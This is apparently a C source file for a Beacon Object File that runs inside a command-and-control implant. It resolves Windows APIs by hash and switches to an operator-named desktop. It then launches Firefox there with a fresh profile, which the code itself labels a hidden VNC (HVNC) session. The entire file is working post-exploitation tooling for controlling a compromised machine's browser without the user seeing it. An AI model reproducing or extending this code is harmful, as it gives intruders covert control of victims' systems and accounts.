#include "common.h"
#include <shlobj.h>
#include <stdio.h>

typedef struct
{
    D_API( LdrLoadDll );
    D_API( RtlInitUnicodeString );
    D_API( CreateProcessA );
    D_API( GetThreadDesktop );
    D_API( SetThreadDesktop );
    D_API( OpenDesktopA );
    D_API( GetCurrentThreadId );
    D_API( CloseDesktop );
    D_API( SHGetFolderPathA );
    D_API( GetSystemTimeAsFileTime );
    D_API( sprintf );
    D_API( CreateDirectoryA );

} API, *PAPI;

VOID WINAPI BofMain( PBAPI_TABLE BeaconApi, PVOID Argv, INT Argc )
{
    API                 Api;
    UNICODE_STRING      Uni;
    DATAP               Parser;
    HANDLE              hMsvcrt = NULL;
    HANDLE              hNtdll = NULL;
    HANDLE              hKernel32 = NULL;
    HANDLE              hShell32 = NULL;
    HANDLE              hUser32 = NULL;
    PCHAR               DesktopName = NULL;
    HDESK               hDesk = NULL;
    HDESK               hOldDesk = NULL;
    BOOL                proc = FALSE;
    STARTUPINFOA        startupInfo = { 0 };
    PROCESS_INFORMATION processInfo = { 0 };
    CHAR                fxPath[MAX_PATH] = { 0 };
    CHAR                dstProf[MAX_PATH] = { 0 };
    CHAR                fxArgs[MAX_PATH * 2] = { 0 };
    CHAR                tick[32] = { 0 };
    FILETIME            ft;
    ULARGE_INTEGER      time;

    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
    RtlSecureZeroMemory( &Parser, sizeof( Parser ) );

    hNtdll = FindModule( H_LIB_NTDLL, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hNtdll == NULL ) { BeaconApi->BeaconPrintf( CALLBACK_ERROR, "no ntdll" ); goto cleanup; };
    Api.LdrLoadDll = FindFunction( hNtdll, H_API_LDRLOADDLL );
    Api.RtlInitUnicodeString = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );

    hKernel32 = FindModule( H_LIB_KERNEL32, NtCurrentTeb()->ProcessEnvironmentBlock );
    hMsvcrt = FindModule( H_LIB_MSVCRT, NtCurrentTeb()->ProcessEnvironmentBlock );
    hShell32 = FindModule( H_LIB_SHELL32, NtCurrentTeb()->ProcessEnvironmentBlock );
    hUser32 = FindModule( H_LIB_USER32, NtCurrentTeb()->ProcessEnvironmentBlock );
    if( hMsvcrt == NULL ) { Api.RtlInitUnicodeString( &Uni, C_PTR( L"msvcrt.dll" ) ); Api.LdrLoadDll( NULL, 0, &Uni, &hMsvcrt ); RtlSecureZeroMemory( &Uni, sizeof( Uni ) ); };
    if( hShell32 == NULL ) { Api.RtlInitUnicodeString( &Uni, C_PTR( L"shell32.dll" ) ); Api.LdrLoadDll( NULL, 0, &Uni, &hShell32 ); RtlSecureZeroMemory( &Uni, sizeof( Uni ) ); };
    if( hUser32 == NULL ) { Api.RtlInitUnicodeString( &Uni, C_PTR( L"user32.dll" ) ); Api.LdrLoadDll( NULL, 0, &Uni, &hUser32 ); RtlSecureZeroMemory( &Uni, sizeof( Uni ) ); };

    Api.CreateProcessA = FindFunction( hKernel32, H_API_CREATEPROCESSA );
    Api.GetCurrentThreadId = FindFunction( hKernel32, H_API_GETCURRENTTHREADID );
    Api.GetSystemTimeAsFileTime = FindFunction( hKernel32, H_API_GETSYSTEMTIMEASFILETIME );
    Api.CreateDirectoryA = FindFunction( hKernel32, H_API_CREATEDIRECTORYA );
    Api.sprintf = FindFunction( hMsvcrt, H_API_SPRINTF );
    Api.SHGetFolderPathA = FindFunction( hShell32, H_API_SHGETFOLDERPATHA );
    Api.GetThreadDesktop = FindFunction( hUser32, H_API_GETTHREADDESKTOP );
    Api.SetThreadDesktop = FindFunction( hUser32, H_API_SETTHREADDESKTOP );
    Api.OpenDesktopA = FindFunction( hUser32, H_API_OPENDESKTOPA );
    Api.CloseDesktop = FindFunction( hUser32, H_API_CLOSEDESKTOP );
    if( !Api.CreateProcessA || !Api.SHGetFolderPathA || !Api.SetThreadDesktop || !Api.CreateDirectoryA )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "missing APIs" );
        goto cleanup;
    };

    BeaconApi->BeaconDataParse( &Parser, Argv, Argc );
    DesktopName = BeaconApi->BeaconDataExtract( &Parser, NULL );
    if( DesktopName == NULL ) { BeaconApi->BeaconPrintf( CALLBACK_ERROR, "no desktop" ); goto cleanup; };

    hOldDesk = Api.GetThreadDesktop( Api.GetCurrentThreadId() );
    hDesk = Api.OpenDesktopA( DesktopName, 0, TRUE, GENERIC_ALL );
    if( hDesk == NULL || !Api.SetThreadDesktop( hDesk ) )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "open/set desktop failed" );
        goto cleanup;
    };

    /* Do NOT copy a live Firefox profile in the BOF — it locks files and kills Demon. Fresh -profile + -no-remote. */
    Api.SHGetFolderPathA( NULL, CSIDL_PROGRAM_FILES, NULL, 0, fxPath );
    strcatA( fxPath, "\\Mozilla Firefox\\firefox.exe" );

    Api.GetSystemTimeAsFileTime( &ft );
    time.LowPart = ft.dwLowDateTime;
    time.HighPart = ft.dwHighDateTime;
    Api.SHGetFolderPathA( NULL, CSIDL_LOCAL_APPDATA, NULL, 0, dstProf );
    strcatA( dstProf, "\\Temp\\hd-ff-" );
    Api.sprintf( tick, "%llu", (unsigned long long)time.QuadPart );
    strcatA( dstProf, tick );
    Api.CreateDirectoryA( dstProf, NULL );

    strcpyA( fxArgs, "\"" );
    strcatA( fxArgs, fxPath );
    strcatA( fxArgs, "\" -no-remote --disable-gpu --disable-software-rasterizer -profile \"" );
    strcatA( fxArgs, dstProf );
    strcatA( fxArgs, "\"" );

    startupInfo.cb = sizeof( startupInfo );
    startupInfo.lpDesktop = DesktopName;
    startupInfo.dwFlags = STARTF_USESHOWWINDOW;
    startupInfo.wShowWindow = SW_SHOW;
    proc = Api.CreateProcessA( NULL, fxArgs, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInfo );
    if( proc == FALSE )
    {
        BeaconApi->BeaconPrintf( CALLBACK_ERROR, "CreateProcess firefox failed" );
        goto cleanup;
    };
    BeaconApi->BeaconPrintf( CALLBACK_OUTPUT, "Launched firefox -no-remote (empty HVNC profile)" );

cleanup:
    if( hOldDesk ) { Api.SetThreadDesktop( hOldDesk ); Api.CloseDesktop( hOldDesk ); };
    if( hDesk ) { Api.CloseDesktop( hDesk ); };
};

VOID go( PVOID Argv, INT Argc )
{
    BAPI_TABLE Api;
    RtlSecureZeroMemory( &Api, sizeof( Api ) );
    Api.BeaconInjectProcess = C_PTR( BeaconInjectProcess );
    Api.BeaconDataExtract   = C_PTR( BeaconDataExtract );
    Api.BeaconDataParse     = C_PTR( BeaconDataParse );
    Api.BeaconDataShort     = C_PTR( BeaconDataShort );
    Api.BeaconIsAdmin       = C_PTR( BeaconIsAdmin );
    Api.BeaconPrintf        = C_PTR( BeaconPrintf );
    BofMain( &Api, Argv, Argc );
};
